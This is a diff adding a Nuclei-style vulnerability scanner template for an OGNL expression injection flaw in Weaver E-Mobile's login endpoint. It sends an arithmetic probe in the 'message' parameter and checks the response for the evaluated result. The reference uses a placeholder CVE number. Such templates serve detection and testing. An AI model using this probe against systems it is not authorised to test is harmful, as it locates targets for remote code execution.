@@ -1,0 +1,24 @@
+id: weaver-e-mobile-ognl-injection
+
+info:
+  name: 泛微E-Mobile前台OGNL表达式注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    泛微E-Mobile前台系统存在OGNL表达式注入漏洞
+      攻击者可通过构造恶意OGNL表达式实现远程代码执行
+      reference:
+        - https://nvd.nist.gov/vuln/detail/CVE-2023-XXXXX
+  tags: 泛微
+
+http:
+- raw:
+  - |
+    GET /login.do?message=12345-5 HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '12340'
